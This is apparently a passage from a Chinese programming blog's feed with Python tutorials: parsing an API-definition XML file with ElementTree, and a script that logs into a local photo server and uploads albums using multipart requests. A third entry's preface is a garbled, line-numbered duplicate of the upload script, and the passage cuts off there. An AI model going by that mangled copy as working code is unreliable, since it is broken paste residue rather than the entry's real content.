<li> xml.sax：SAX2 基类和便利函数</li>
<li> xml.parsers.expat：Expat 解析器绑定</li>
</ul>
<hr>
<h1 id="实现步骤">2. 实现步骤</h1>
<h2 id="示例xml文件">2.1. 示例 xml 文件</h2>
<p>  首先，定义了一个如下所示内容的 xml 文件，可用于接口 url 地址和入参定义的配置。
</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rests</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">service</span> <span class="attr">path</span>=<span class="string">"/api/v1"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">operation</span> <span class="attr">path</span>=<span class="string">"/authentication"</span> <span class="attr">name</span>=<span class="string">"authentication"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span>&gt;</span>account<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span>&gt;</span>password<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span>&gt;</span>verifycode<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">operation</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">operation</span> <span class="attr">path</span>=<span class="string">"/queryuser"</span> <span class="attr">name</span>=<span class="string">"queryuser"</span> <span class="attr">method</span>=<span class="string">"get"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span>&gt;</span>username<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">operation</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">operation</span> <span class="attr">path</span>=<span class="string">"/adduser"</span> <span class="attr">name</span>=<span class="string">"adduser"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span>&gt;</span>username<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span>&gt;</span>password<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span>&gt;</span>role<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span>&gt;</span>groupid<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">operation</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">operation</span> <span class="attr">path</span>=<span class="string">"/addgroup"</span> <span class="attr">name</span>=<span class="string">"addgroup"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span>&gt;</span>groupname<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span>&gt;</span>function<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span>&gt;</span>description<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">operation</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">operation</span> <span class="attr">path</span>=<span class="string">"/delgroupbyid"</span> <span class="attr">name</span>=<span class="string">"delgroupbyid"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span>&gt;</span>groupid<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">operation</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rests</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<h2 id="代码实现">2.2. 代码实现</h2>
<ol type="1">
<li><p>Python 解析 xml 文件的第一步，首先当然是要加载该文件。导入 xml.etree.cElementTree 包之后，通过调用 parse () 方法，即可加载指定的 xml 文件。
</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 导入包</span></span><br><span class="line"><span class="keyword">import</span> xml.etree.cElementTree <span class="keyword">as</span> ET</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定要解析的文件</span></span><br><span class="line">file = <span class="string">'./test.xml'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用parse方法，生成一个ElementTree类型的实例化对象</span></span><br><span class="line">root = ET.parse(file)</span><br><span class="line">Out[<span class="number">5</span>]: &lt;<span class="keyword">class</span> <span class="string">'xml.etree.ElementTree.ElementTree'</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>通过分析上述自定义的 xml 文件内容，可得知：</p></li>
</ol>
<ul>
<li>service 是一个大标签对，它有一个 path 属性，相当于是接口 url 的根路径。</li>
<li>所有的接口定义，都在 service 这个大标签对内。</li>
<li>每一个接口名称、地址、方法以及接口入参，都是分别存在于单独的一个 operation 标签对中。</li>
</ul>
<ol start="3" type="1">
<li><p>接下来，我们就需要先获取 service 标签对中的所有 operation 子标签了。可利用 findal () 方法，查找到所有的指定标签名称。
</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 获取</span></span><br><span class="line">service_list = root.findall(<span class="string">'service'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(service_list))</span><br><span class="line"><span class="comment"># 由于上述xml文件中只有一个service标签对，所以长度是1</span></span><br><span class="line">Out[<span class="number">11</span>]: <span class="number">1</span></span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>到这里，咱们已经获取到文件中的所有 service 标签了，它是一个列表类型，所以需要通过循环遍历，进一步解析各个 service 标签内容。
</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 如果一个xml文件中，有多个service大标签，则需要通过for循环来遍历。</span></span><br><span class="line"><span class="keyword">for</span> serivce <span class="keyword">in</span> service_list:</span><br><span class="line">    <span class="built_in">print</span>(service)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于上述示例xml文件只有一个serivce大标签，则直接通过列表下标，获取service。</span></span><br><span class="line">service = service_list[<span class="number">0</span>]</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>此时的 service，是一个具体的对象，它有一个字典长度是 1 的 attrib 属性；同时还有 5 个元素，即对应着它里面的 5 个 operation 子标签，咱们可以通过 for 循环来获取它。
<img src="https://ae01.alicdn.com/kf/U32762978945248c4bdf590645f9bcb90W.jpg" alt="service对象内容"> </p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 获取service标签的path属性值</span></span><br><span class="line">service.attrib[<span class="string">'path'</span>]</span><br><span class="line">Out[<span class="number">12</span>]: <span class="string">'/api/v1'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 以第3个接口为例，获取该接口的属性、文本等信息。</span></span><br><span class="line"><span class="comment"># 最终代码，会以for循环的形式实现</span></span><br><span class="line">operation = service[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取接口名称属性</span></span><br><span class="line">operation.attrib[<span class="string">'name'</span>]</span><br><span class="line">Out[<span class="number">18</span>]: <span class="string">'adduser'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取接口全路径属性</span></span><br><span class="line">service.attrib[<span class="string">'path'</span>] + operation.attrib[<span class="string">'path'</span>]</span><br><span class="line">Out[<span class="number">19</span>]: <span class="string">'/api/v1/adduser'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取接口调用方法属性</span></span><br><span class="line">operation.attrib[<span class="string">'method'</span>]</span><br><span class="line">Out[<span class="number">20</span>]: <span class="string">'post'</span></span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>最后，咱们还剩下接口的入参没有获取到，接口的入参，都保存在 operation 标签中的 param 子标签内，且是以文本的形式存储的。所以，通过 for 循环获取到 param 子标签后，再获取其中的 text 属性即可。
</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> param <span class="keyword">in</span> operation:</span><br><span class="line">    <span class="built_in">print</span>(param.text)</span><br><span class="line">Out[<span class="number">21</span>]: </span><br><span class="line">username</span><br><span class="line">password</span><br><span class="line">role</span><br><span class="line">groupid</span><br></pre></td></tr></tbody></table></figure><p></p></li>
</ol>
<h1 id="整体源码">3. 整体源码</h1>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">import</span> xml.etree.cElementTree <span class="keyword">as</span> ET</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_interface_list</span>(<span class="params">root</span>):</span><br><span class="line">    service_list = root.findall(<span class="string">'service'</span>)</span><br><span class="line">    <span class="keyword">for</span> service_tag <span class="keyword">in</span> service_list:</span><br><span class="line">        service_path = service_tag.attrib[<span class="string">'path'</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> opration_tag <span class="keyword">in</span> service_tag:</span><br><span class="line">            interface_name = opration_tag.attrib[<span class="string">'name'</span>]</span><br><span class="line">            interface_path = service_path + opration_tag.attrib[<span class="string">'path'</span>]</span><br><span class="line">            interface_method = opration_tag.attrib[<span class="string">'method'</span>]</span><br><span class="line">            param = []</span><br><span class="line">            <span class="keyword">for</span> param_tag <span class="keyword">in</span> opration_tag:</span><br><span class="line">                param.append(param_tag.text)</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"接口名称:”<span class="subst">{interface_name}</span>,接口调用方法:<span class="subst">{interface_method}</span>,接口url:<span class="subst">{interface_path}</span>, 接口入参:<span class="subst">{param}</span>"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    xml_file = <span class="string">'./test.xml'</span></span><br><span class="line">    root_tag = <span class="string">'service'</span></span><br><span class="line">    attr = <span class="string">'name'</span></span><br><span class="line">    </span><br><span class="line">    interface_xml = ET.parse(xml_file)</span><br><span class="line">    get_interface_list(interface_xml)</span><br></pre></td></tr></tbody></table></figure>
<h1 id="运行效果">4. 运行效果</h1>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">接口名称:authentication,接口调用方法:post,接口地址:/api/v1/authentication, 接口入参:[<span class="string">'account'</span>, <span class="string">'password'</span>, <span class="string">'verifycode'</span>]</span><br><span class="line">接口名称:queryuser,接口调用方法:get,接口地址:/api/v1/queryuser, 接口入参:[<span class="string">'username'</span>]</span><br><span class="line">接口名称:adduser,接口调用方法:post,接口地址:/api/v1/adduser, 接口入参:[<span class="string">'username'</span>, <span class="string">'password'</span>, <span class="string">'role'</span>, <span class="string">'groupid'</span>]</span><br><span class="line">接口名称:addgroup,接口调用方法:post,接口地址:/api/v1/addgroup, 接口入参:[<span class="string">'groupname'</span>, <span class="string">'function'</span>, <span class="string">'description'</span>]</span><br><span class="line">接口名称:delgroupbyid,接口调用方法:post,接口地址:/api/v1/delgroupbyid, 接口入参:[<span class="string">'groupid'</span>]</span><br></pre></td></tr></tbody></table></figure>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>解析xml</tag>
      </tags>
  </entry>
  <entry>
    <title>【Python】利用 requests_toolbelt 库发送 multipart 类型的请求和上传文件</title>
    <url>/p/bc1414df.html</url>
    <content><![CDATA[<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># -*-coding: utf-8-*-</span></span><br><span class="line"><span class="string">"""========================================</span></span><br><span class="line"><span class="string">@author : BoyceChen</span></span><br><span class="line"><span class="string">@date   : 2022/05/03 10:30:33</span></span><br><span class="line"><span class="string">@desc   : </span></span><br><span class="line"><span class="string">========================================"""</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests_toolbelt <span class="keyword">import</span> MultipartEncoder</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> log_recorder <span class="keyword">import</span> my_logs</span><br><span class="line"></span><br><span class="line">host = <span class="string">'192.168.88.117'</span></span><br><span class="line">port = <span class="string">'2342'</span></span><br><span class="line"></span><br><span class="line">root_path = <span class="string">r'D:\99Temp'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@my_logs.catch</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_headers</span>(<span class="params">session_id=<span class="literal">None</span>, content_type=<span class="literal">None</span></span>):</span><br><span class="line">    headers = {</span><br><span class="line">        <span class="string">'Host'</span>: <span class="string">f'<span class="subst">{host}</span>:<span class="subst">{port}</span>'</span>,</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'application/json, text/plain, */*'</span>,</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '</span></span><br><span class="line">                      <span class="string">'Chrome/88.0.4324.150 Safari/537.36'</span>,</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">'application/json'</span>,</span><br><span class="line">        <span class="string">'Origin'</span>: <span class="string">f'http://<span class="subst">{host}</span>:<span class="subst">{port}</span>'</span>,</span><br><span class="line">        <span class="string">'Referer'</span>: <span class="string">f'http://<span class="subst">{host}</span>:<span class="subst">{port}</span>/auth/login'</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9'</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> session_id <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        headers[<span class="string">"X-Session-ID"</span>] = session_id</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> content_type <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        headers[<span class="string">"Content-Type"</span>] = content_type</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> headers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@my_logs.catch</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserLogin</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        <span class="variable language_">self</span>.album_info = {}</span><br><span class="line">        <span class="variable language_">self</span>.username = username</span><br><span class="line">        <span class="variable language_">self</span>.password = password</span><br><span class="line">        <span class="comment"># self.session = None</span></span><br><span class="line">        <span class="variable language_">self</span>.session_id = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">login_action</span>(<span class="params">self</span>):</span><br><span class="line">        login_url = <span class="string">f'http://<span class="subst">{host}</span>:<span class="subst">{port}</span>/api/v1/session'</span></span><br><span class="line">        payload = {<span class="string">"username"</span>: <span class="variable language_">self</span>.username, <span class="string">"password"</span>: <span class="variable language_">self</span>.password}</span><br><span class="line">        <span class="keyword">with</span> requests.Session() <span class="keyword">as</span> <span class="variable language_">self</span>.session:</span><br><span class="line">            r = <span class="variable language_">self</span>.session.post(login_url, headers=get_headers(), data=json.dumps(payload))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果状态不是200，则说明登录失败</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">200</span> == r.status_code:</span><br><span class="line">            my_logs.info(<span class="string">"登录成功！"</span>)</span><br><span class="line">            <span class="variable language_">self</span>.session_id = r.headers.get(<span class="string">"X-Session-Id"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            my_logs.error(<span class="string">f"登录失败！<span class="subst">{r.content.decode(<span class="string">'utf-8'</span>)}</span>"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_albums</span>(<span class="params">self, name</span>):</span><br><span class="line">        url = <span class="string">f'http://<span class="subst">{host}</span>:<span class="subst">{port}</span>/api/v1/albums'</span></span><br><span class="line">        payload = {<span class="string">"Title"</span>: name, <span class="string">"Favorite"</span>: <span class="literal">False</span>}</span><br><span class="line">        r = <span class="variable language_">self</span>.session.post(url, headers=get_headers(<span class="variable language_">self</span>.session_id), data=json.dumps(payload))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 创建相册后自动获取一次当前所有的相册集列表</span></span><br><span class="line">        <span class="variable language_">self</span>.get_all_albums()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> r.status_code</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">upload_file</span>(<span class="params">self, album_name, file_list</span>):</span><br><span class="line">        timestamp = <span class="built_in">int</span>(time.time() * <span class="number">1000</span>)</span><br><span class="line">        <span class="comment"># 上传一张照片有两个动作，上传和移动</span></span><br><span class="line">        upload_url = <span class="string">f"http://<span class="subst">{host}</span>:<span class="subst">{port}</span>/api/v1/upload/<span class="subst">{timestamp}</span>"</span></span><br><span class="line">        move_url = <span class="string">f"http://<span class="subst">{host}</span>:<span class="subst">{port}</span>/api/v1/import/upload/<span class="subst">{timestamp}</span>"</span></span><br><span class="line">        <span class="comment"># 如果相册集不存在，则创建一次</span></span><br><span class="line">        <span class="keyword">if</span> album <span class="keyword">not</span> <span class="keyword">in</span> <span class="variable language_">self</span>.album_info.keys():</span><br><span class="line">            status = <span class="variable language_">self</span>.create_albums(album)</span><br><span class="line">            <span class="keyword">if</span> <span class="number">200</span> == status:</span><br><span class="line">                my_logs.info(<span class="string">f"相册集创建成功：<span class="subst">{album}</span>"</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                my_logs.info(<span class="string">f"相册集创建失败：<span class="subst">{album}</span>"</span>)</span><br><span class="line"></span><br><span class="line">        uid = <span class="variable language_">self</span>.album_info[album_name]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> files <span class="keyword">in</span> file_list:</span><br><span class="line">            upload_data = MultipartEncoder(</span><br><span class="line">                fields={</span><br><span class="line">                    <span class="string">"files"</span>: (</span><br><span class="line">                        <span class="string">f"files=<span class="subst">{files}</span>"</span>, <span class="built_in">open</span>(os.path.join(root_path, album_name, files), <span class="string">'rb'</span>), <span class="string">'image/jpeg'</span>),</span><br><span class="line">                }</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            move_data = {<span class="string">"move"</span>: <span class="literal">True</span>, <span class="string">"albums"</span>: [uid]}</span><br><span class="line"></span><br><span class="line">            r = <span class="variable language_">self</span>.session.post(upload_url, data=upload_data,</span><br><span class="line">                                  headers=get_headers(<span class="variable language_">self</span>.session_id, content_type=upload_data.content_type))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="number">200</span> == r.status_code:</span><br><span class="line">                <span class="comment"># 如果上传成功，再移动</span></span><br><span class="line">                my_logs.info(<span class="string">f"上传成功，相册名称：<span class="subst">{album}</span>，图片名称：<span class="subst">{files}</span>"</span>)</span><br><span class="line">                r2 = <span class="variable language_">self</span>.session.post(move_url, data=json.dumps(move_data), headers=get_headers(<span class="variable language_">self</span>.session_id))</span><br><span class="line">                <span class="keyword">if</span> <span class="number">200</span> == r2.status_code:</span><br><span class="line">                    my_logs.info(<span class="string">f"移动成功，图片名称：<span class="subst">{files}</span>"</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    my_logs.warning(<span class="string">f"移动失败，图片名称：<span class="subst">{files}</span>，返回信息：<span class="subst">{r2.content.decode(<span class="string">'utf-8'</span>)}</span>"</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                my_logs.warning(<span class="string">f"上传失败，相册名称：<span class="subst">{album}</span>，图片名称：<span class="subst">{files}</span>"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_all_albums</span>(<span class="params">self</span>):</span><br><span class="line">        __max_num = <span class="number">500</span></span><br><span class="line">        url = <span class="string">f"http://<span class="subst">{host}</span>:<span class="subst">{port}</span>/api/v1/albums?count=<span class="subst">{__max_num}</span>&amp;offset=0&amp;q=&amp;category=&amp;type=album&amp;order=name"</span></span><br><span class="line">        r = <span class="variable language_">self</span>.session.get(url=url, headers=get_headers(<span class="variable language_">self</span>.session_id))</span><br><span class="line">        <span class="keyword">if</span> <span class="number">200</span> == r.status_code:</span><br><span class="line">            content = json.loads(r.content.decode(<span class="string">'utf-8'</span>))</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> content:</span><br><span class="line">                <span class="variable language_">self</span>.album_info[c[<span class="string">"Title"</span>]] = c[<span class="string">'UID'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    imp_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    users = UserLogin(<span class="string">'admin'</span>, <span class="string">'123456'</span>)</span><br><span class="line">    users.login_action()</span><br><span class="line">    local_album_list = os.listdir(root_path)</span><br><span class="line">    <span class="keyword">for</span> album <span class="keyword">in</span> local_album_list:</span><br><span class="line">        <span class="comment"># 先获取当前的相册列表，如果没有则创建，否则跳过</span></span><br><span class="line">        users.get_all_albums()</span><br><span class="line">        flist = os.listdir(os.path.join(root_path, album))</span><br><span class="line">        users.upload_file(album_name=album, file_list=flist)</span><br><span class="line">        imp_num += <span class="built_in">len</span>(flist)</span><br><span class="line"></span><br><span class="line">    my_logs.info(<span class="string">f"已完成导入，共：<span class="subst">{imp_num}</span>张！"</span>)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>multipart</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>【Python】利用 requests 模块获取全国省市区的经纬度信息</title>
    <url>/p/d4615dd5.html</url>
    <content><![CDATA[<h1 id="前言">1. 前言</h1>
<p>xxxxxxxxxx140&nbsp;1# -<em>-coding:
utf-8-</em>-2"""========================================3@author :
BoyceChen4@date &nbsp; : 2022/05/03 10:30:335@desc &nbsp; :
6========================================"""7import json8import
os9import time10​11import requests12from requests_toolbelt import
MultipartEncoder13​14from log_recorder import my_logs15​16host =
'192.168.88.117'17port = '2342'18​19root_path =
r'D:\99Temp'20​21​22@my_logs.catch23def get_headers(session_id=None,
content_type=None):24 &nbsp; &nbsp;headers = {25 &nbsp; &nbsp; &nbsp; &nbsp;'Host':
f'{host}:{port}',26 &nbsp; &nbsp; &nbsp; &nbsp;'Accept': 'application/json, text/plain,
<em>/</em>',27 &nbsp; &nbsp; &nbsp; &nbsp;'User-Agent': 'Mozilla/5.0 (Windows NT 10.0;
Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '28 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp;'Chrome/88.0.4324.150 Safari/537.36',29 &nbsp; &nbsp; &nbsp; &nbsp;'Content-Type':
'application/json',30 &nbsp; &nbsp; &nbsp; &nbsp;'Origin': f'http://{host}:{port}',31 &nbsp; &nbsp; &nbsp;
&nbsp;'Referer': f'http://{host}:{port}/auth/login',32 &nbsp; &nbsp; &nbsp;
&nbsp;'Accept-Encoding': 'gzip, deflate',33 &nbsp; &nbsp; &nbsp; &nbsp;'Accept-Language':
'zh-CN,zh;q=0.9'34 &nbsp; }35 &nbsp; &nbsp;if session_id is not None:36 &nbsp; &nbsp; &nbsp;
&nbsp;headers["X-Session-ID"] = session_id37​38 &nbsp; &nbsp;if content_type is not
None:39 &nbsp; &nbsp; &nbsp; &nbsp;headers["Content-Type"] = content_type40​41 &nbsp; &nbsp;return
headers42​43​44@my_logs.catch45class UserLogin:46 &nbsp; &nbsp;def
<strong>init</strong>(self, username, password):47 &nbsp; &nbsp; &nbsp;
&nbsp;self.album_info = {} 48 &nbsp; &nbsp; &nbsp; &nbsp;self.username = username49 &nbsp; &nbsp; &nbsp;
&nbsp;self.password = password50 &nbsp; &nbsp; &nbsp; &nbsp;# self.session = None51 &nbsp; &nbsp; &nbsp;
&nbsp;self.session_id = ""52​53 &nbsp; &nbsp;def login_action (self):54 &nbsp; &nbsp; &nbsp; &nbsp;login_url
= f'http://{host}:{port}/api/v1/session'55 &nbsp; &nbsp; &nbsp; &nbsp;payload = {"username":
self.username, "password": self.password} 56 &nbsp; &nbsp; &nbsp; &nbsp;with
requests.Session () as self.session:57 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;r =
self.session.post (login_url, headers=get_headers (),
data=json.dumps (payload)) 58​59 &nbsp; &nbsp; &nbsp; &nbsp;# 如果状态不是 200，则说明登录失败 60
&nbsp; &nbsp; &nbsp; &nbsp;if 200 == r.status_code:61 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
&nbsp;my_logs.info ("登录成功！") 62 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;self.session_id =
r.headers.get ("X-Session-Id") 63 &nbsp; &nbsp; &nbsp; &nbsp;else:64 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
&nbsp;my_logs.error (f"登录失败！{r.content.decode ('utf-8')}") 65​66 &nbsp; &nbsp;def
create_albums (self, name):67 &nbsp; &nbsp; &nbsp; &nbsp;url =
f'http://{host}:{port}/api/v1/albums'68 &nbsp; &nbsp; &nbsp; &nbsp;payload = {"Title": name,
"Favorite": False} 69 &nbsp; &nbsp; &nbsp; &nbsp;r = self.session.post (url,
headers=get_headers (self.session_id), data=json.dumps (payload)) 70​71 &nbsp; &nbsp;
&nbsp; &nbsp;# 创建相册后自动获取一次当前所有的相册集列表 72 &nbsp; &nbsp; &nbsp;
&nbsp;self.get_all_albums () 73​74 &nbsp; &nbsp; &nbsp; &nbsp;return r.status_code75​76 &nbsp; &nbsp;def
upload_file (self, album_name, file_list):77 &nbsp; &nbsp; &nbsp; &nbsp;timestamp =
int (time.time () * 1000) 78 &nbsp; &nbsp; &nbsp; &nbsp;# 上传一张照片有两个动作，上传和移动 79
&nbsp; &nbsp; &nbsp; &nbsp;upload_url = f"http://{host}:{port}/api/v1/upload/{timestamp}"80
&nbsp; &nbsp; &nbsp; &nbsp;move_url =
f"http://{host}:{port}/api/v1/import/upload/{timestamp}"81 &nbsp; &nbsp; &nbsp; &nbsp;#
如果相册集不存在，则创建一次 82 &nbsp; &nbsp; &nbsp; &nbsp;if album not in
self.album_info.keys ():83 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;status =
self.create_albums (album) 84 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;if 200 == status:85 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
&nbsp;my_logs.info (f"相册集创建成功：{album}") 86 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;else:87 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp;my_logs.info (f"相册集创建失败：{album}") 88​89 &nbsp; &nbsp; &nbsp; &nbsp;uid =
self.album_info [album_name] 90​91 &nbsp; &nbsp; &nbsp; &nbsp;for files in file_list:92 &nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp;upload_data = MultipartEncoder (93 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;fields={94 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;"files": (95 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;f"files={files}",
open (os.path.join (root_path, album_name, files), 'rb'), 'image/jpeg'),96
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; } 97 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ) 98​99 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;move_data = {"move": True,
"albums": [uid]} 100​101 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;r = self.session.post (upload_url,
data=upload_data,102 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
&nbsp;headers=get_headers (self.session_id,
content_type=upload_data.content_type)) 103​104 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;if 200 ==
r.status_code:105 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# 如果上传成功，再移动 106 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
&nbsp;my_logs.info (f"上传成功，相册名称：{album}，图片名称：{files}") 107 &nbsp; &nbsp;
